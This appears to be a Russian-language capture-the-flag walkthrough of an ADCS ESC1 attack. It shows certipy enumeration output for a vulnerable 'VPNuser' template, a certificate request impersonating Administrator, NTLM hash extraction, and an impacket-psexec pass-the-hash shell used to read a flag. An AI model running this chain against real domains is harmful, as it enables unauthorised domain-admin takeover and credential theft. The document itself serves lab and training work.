Выполним перечисление сервера ADCS
```
certipy-ad find -u 'Bob@corp.local' -p 'b0b1sH@cker' -dc-ip 10.53.50.14 -stdout -vulnerable  
```

>[!tip]- certipy ad
>Certipy v5.0.2 - by Oliver Lyak (ly4k)
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-CYBER' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-CYBER'
[*] Checking web enrollment for CA 'CA-CYBER' @ 'dc.corp.local'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
CA Name                             : CA-CYBER
DNS Name                            : dc.corp.local
Certificate Subject                 : CN=CA-CYBER, DC=corp, DC=local
Certificate Serial Number           : 1318E7E0926C2EA149F550E90C170EA5
Certificate Validity Start          : 2025-08-25 14:40:22+00:00
Certificate Validity End            : 2035-08-25 14:50:22+00:00
Web Enrollment
HTTP
Enabled                         : False
  HTTPS
  Enabled                         : False
  User Specified SAN                  : Disabled
   Request Disposition                 : Issue
   Enforce Encryption for Requests     : Enabled
   Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
 Permissions
  Owner                             : CORP.LOCAL\Administrators
  Access Rights
  ManageCa                        : CORP.LOCAL\Administrators
   CORP.LOCAL\Domain Admins
  CORP.LOCAL\Enterprise Admins
 ManageCertificates              : CORP.LOCAL\Administrators
   CORP.LOCAL\Domain Admins
   CORP.LOCAL\Enterprise Admins
   Enroll                          : CORP.LOCAL\Authenticated Users
Certificate Templates
Template Name                       : VPNuser
   Display Name                        : VPNuser
   Certificate Authorities             : CA-CYBER
   Enabled                             : True
   Client Authentication               : True
   Enrollment Agent                    : False
   Any Purpose                         : False
   Enrollee Supplies Subject           : True
  Certificate Name Flag               : EnrolleeSuppliesSubject
   Enrollment Flag                     : IncludeSymmetricAlgorithms
PublishToDs
Private Key Flag                    : ExportableKey
Extended Key Usage                  : Client Authentication
  Secure Email
  Encrypting File System
Requires Manager Approval           : False
Requires Key Archival               : False
Authorized Signatures Required      : 0
Schema Version                      : 2
Validity Period                     : 1 year
Renewal Period                      : 6 weeks
Minimum RSA Key Length              : 2048
Template Created                    : 2025-08-25T14:51:12+00:00
Template Last Modified              : 2025-08-25T14:51:35+00:00
Permissions
 Enrollment Permissions
 Enrollment Rights               : CORP.LOCAL\Domain Users
Object Control Permissions
  Owner                           : CORP.LOCAL\Enterprise Admins
 Full Control Principals         : CORP.LOCAL\Domain Admins
  CORP.LOCAL\Local System
   CORP.LOCAL\Enterprise Admins
  Write Owner Principals          : CORP.LOCAL\Domain Admins
  CORP.LOCAL\Local System
CORP.LOCAL\Enterprise Admins
Write Dacl Principals           : CORP.LOCAL\Domain Admins
CORP.LOCAL\Local System
   CORP.LOCAL\Enterprise Admins
   [+] User Enrollable Principals      : CORP.LOCAL\Domain Users
   [!] Vulnerabilities
   ESC1                              : Enrollee supplies subject and template allows client authentication.

Используя полученный вывод запросим сертификат с альтернативным SAN
```
certipy-ad req -u 'Bob@corp.local' -p 'b0b1sH@cker' -dc-ip 10.53.50.14 -ca CA-CYBER -template VPNuser -upn 'Administrator@corp.local'
```

Выполним атаку UnpackTheHash для извлечения NTLM-хеша пользователя:
```
certipy-ad -debug auth -pfx administrator.pfx -domain corp.local  -dc-ip 10.53.50.14  
```


Получим соединение и прочитаем флаг
```
impacket-psexec -hashes ':<hash>' Administrator@10.53.50.14
```
